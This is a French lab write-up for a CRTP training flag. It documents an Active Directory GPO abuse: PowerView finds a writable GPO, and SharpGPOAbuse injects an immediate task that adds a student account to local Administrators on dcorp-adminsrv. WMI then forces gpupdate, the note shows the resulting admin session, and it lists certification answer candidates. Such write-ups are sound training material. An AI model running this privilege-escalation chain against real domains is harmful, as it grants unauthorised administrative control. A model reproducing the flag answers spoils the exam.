---
flag: 9
machine: Student VM
statut: à valider
technique: GPO abuse (SharpGPOAbuse — Immediate Task)
LO: [[LO06 - Derivative local admin]]
---

# F09 · Attribut Group Policy modifié

> [!summary] Objectif
> Identifier l'attribut LDAP de l'objet `groupPolicyContainer` qui est **modifié** quand on ajoute un Immediate Task via SharpGPOAbuse. En bonus, l'abus donne **admin local sur toutes les machines de l'OU liée** — dans ce lab, `dcorp-adminsrv` (OU `Applocked`) → débloque tout le sous-arbre LO7 dcorp-adminsrv (F12/F13/F14/F15).

## Contexte
- **Étape attack flow** : LO6 — abus d'ACL sur une GPO à partir d'un principal contrôlé (studentx via `RDPUsers`).
- **Ce qu'on a** : `studentx` (`student426` dans ce pod), membre de `dcorp\RDPUsers`. Aucun besoin d'être DA/admin local ailleurs.
- **Ce qu'on cherche** : le **nom exact de l'attribut LDAP** que SharpGPOAbuse touche (bump extensions + versionNumber).

## Solution

### Étape 1 — Trouver une GPO writeable par mon principal
```powershell
. C:\AD\Tools\PowerView.ps1
$me = (Get-DomainUser $env:USERNAME).objectsid
$mygroups = (Get-DomainGroup -MemberIdentity $env:USERNAME).objectsid
$targets = @($me) + @($mygroups)

Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ? { $_.SecurityIdentifier -in $targets -and $_.ActiveDirectoryRights -match "WriteDacl|GenericAll|GenericWrite|WriteOwner|WriteProperty" } |
  select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```
→ Résultat pod : GPO GUID `{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}` = **`Applocker`**, principal `dcorp\RDPUsers` avec **GenericAll + GenericWrite**.

### Étape 2 — Résoudre GPO et OU liée
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" | select displayname, name, gpcfilesyspath
Get-DomainOU | ? { $_.gplink -match "0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E" } | select name, distinguishedname
Get-DomainComputer -SearchBase "OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local" | select samaccountname, dnshostname
```
→ GPO `Applocker` → OU `Applocked` → **`DCORP-ADMINSRV$`** (unique machine dans l'OU).

### Étape 3 — Snapshot AVANT
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" |
  select displayname, gPCMachineExtensionNames, gPCUserExtensionNames, versionNumber, gpcfilesyspath
```
→ `versionNumber = 17`, `gpcmachineextensionnames` = 2 blocs `[{35378EAC…}{62C1845D…}{D02B1F72…}][{827D319E…}{803E14A0…}]`.

### Étape 4 — Abus : Immediate Task qui ajoute studentx aux Administrators locaux
```powershell
cd C:\AD\Tools
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName "AV Check" `
  --Author "NT AUTHORITY\SYSTEM" `
  --Command "cmd.exe" `
  --Arguments "/c net localgroup Administrators dcorp\student426 /add" `
  --GPOName "Applocker"
```
→ Sortie confirme : `Creating file ...\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`, `versionNumber attribute changed successfully`, `The GPO was modified to include a new immediate task`.

### Étape 5 — Snapshot APRÈS → attribut modifié
```powershell
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}" |
  select displayname, gPCMachineExtensionNames, gPCUserExtensionNames, versionNumber, gpcfilesyspath
```
Diff observé :
- `versionNumber` : **17 → 18** (bump normal)
- **`gPCMachineExtensionNames` : ajout de 2 blocs** = `[{00000000-…}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]` + `[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-…}]` (les CSE Scheduled Tasks / Preferences)
- `gpcfilesyspath` : inchangé (SharpGPOAbuse ne touche PAS au SYSVOL path — c'est GPOddity qui le ferait).

### Étape 6 — Forcer gpupdate distant (non-admin → via WMI)
```powershell
Invoke-WmiMethod -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -Class Win32_Process -Name Create -ArgumentList "cmd /c gpupdate /force"
```
→ `ReturnValue: 0` = WMI accepté (permission `Authenticated Users` par défaut sur Win32_Process.Create dans ce lab).

### Étape 7 — Preuve : PSSession admin local
```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
# → PS s'ouvre : [dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student426\Documents>
ls C:\Users
# → Administrator / appadmin / srvadmin / websvc / student426 → 3 comptes cibles ont un profil
whoami /groups | Select-String "Administrators"
```

## Réponse — candidats (à confirmer)

Trois attributs bougent quand tu lances SharpGPOAbuse. Le nom exact accepté par CRTP dépend de la formulation attendue :

| Rang | Attribut candidat | Rationale |
|------|-------------------|-----------|
| 1 | **`versionNumber`** | SharpGPOAbuse annonce explicitement `[+] versionNumber attribute changed successfully`. Marker canonique de re-processing client. Bumpe **toujours** — 17 → 18 dans ce pod. |
| 2 | `gPCMachineExtensionNames` | Ajout de 2 CSE GUIDs (Scheduled Tasks/Preferences) : `{AADCED64-746C-4633-A97C-D61349046527}` + `{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}`. |
| 3 | `gpcfilesyspath` | **UNIQUEMENT si GPOddity** (repointe SYSVOL vers rogue SMB share). Ne bouge PAS via SharpGPOAbuse. |

Variantes de casse à essayer si rejet : `versionNumber`, `versionnumber`, `VersionNumber`.

| Élément contexte | Valeur |
|---------|--------|
| GPO ciblée | `Applocker` (GUID `{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}`) |
| OU touchée | `Applocked` → `dcorp-adminsrv` |
| Payload SYSTEM | `net localgroup Administrators dcorp\student426 /add` |
| Version avant/après | 17 → 18 |

## Pièges et OPSEC

> [!failure]- Journal des murs
> - **GPOddity via netcat listener sur student VM** → jamais de call reçu. Cause : Windows FW student VM bloque tout inbound (**identique au mur LO07**). Fix : abandon GPOddity, pivot SharpGPOAbuse (100% outbound / LDAP).
> - **`SharpGPOAbuse --RemoveComputerTask` lancé DEPUIS dcorp-adminsrv (PSSession)** → `not recognized`. L'exe n'est **que** sur la student VM. **Faire le cleanup depuis la student VM**, pas depuis la box compromise.
> - `Invoke-WmiMethod ... gpupdate /force` marche même en non-admin car Win32_Process.Create est ouvert aux `Authenticated Users` par défaut dans ce lab.

- **Attribut discriminant** : `versionNumber` bumpe **toujours** — la vraie réponse "quel attribut est modifié" = `gPCMachineExtensionNames` (nouvel `CSE GUID` = déclencheur du re-processing côté client).
- **Différence avec `--AddUserTask`** : celui-ci toucherait `gPCUserExtensionNames`. Nous avons pris Computer parce que `Applocker` s'applique côté ordinateur (`gpcmachineextensionnames` déjà non-vide, `gPCUserExtensionNames` vide).
- **Cleanup après validation** — depuis student VM :
  ```powershell
  cd C:\AD\Tools
  .\SharpGPOAbuse.exe --RemoveComputerTask --TaskName "AV Check" --GPOName "Applocker"
  ```
- **Traces** : Event ID 5136 (Directory Service Changes) sur DC = modif d'attribut LDAP ; fichier `ScheduledTasks.xml` déposé dans SYSVOL.

## Refs
- [[Cheatsheet - GPO et OU]]
- [[Cheatsheet - ACL et droits AD]]
- [[Cheatsheet - BloodHound SharpHound]]
- [[LO06 - Derivative local admin]]
- [[Synthèse - ACL et GPO]]

[[Flags - Index]] · [[Journal - Index]]
